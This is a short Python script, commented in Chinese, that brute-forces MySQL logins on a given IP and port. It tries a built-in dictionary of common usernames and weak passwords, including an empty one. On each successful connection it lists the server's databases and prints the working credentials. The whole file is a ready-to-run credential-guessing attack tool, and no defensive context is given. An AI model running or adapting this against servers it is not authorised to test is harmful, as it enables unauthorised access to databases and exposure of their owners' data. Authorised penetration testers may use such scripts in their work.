import mysql.connector
import sys

IP=sys.argv[1]
hh=IP.split(".",4)
num=""
for i in hh:
    num = num+str(i)

if len(sys.argv)==3 and (num.isdigit()==True and sys.argv[2].isdigit()==True): # 简单判断IP地址
    print('\n传入的IP地址和端口为:',sys.argv[1],sys.argv[2]) # 判断正确后显示IP地址和端口
else:
    print("\n请输入正确的IP地址和端口\n")
    sys.exit()

mysql_username = ("root","test", "admin", "user") # 账号字典
common_weak_password = ("","123456","test","root","admin") # 密码字典

for username in mysql_username:
  for password in common_weak_password:
    try:
        mydb = mysql.connector.connect(
        host=sys.argv[1],       # 主机地址
        port=sys.argv[2],
        user=username,   
        passwd=password  
        )

        mycursor= mydb.cursor()  
        mycursor.execute("SHOW DATABASES")  # 操作项
        result = mycursor.fetchall()  # 获得操作结果

        print("注入成功,数据库目录为：",result) # 显示结果
        print("账号密码为：",username,password) # 显示账号密码
        print("")
        mydb.close() # 关闭接口
    except Exception:
        pass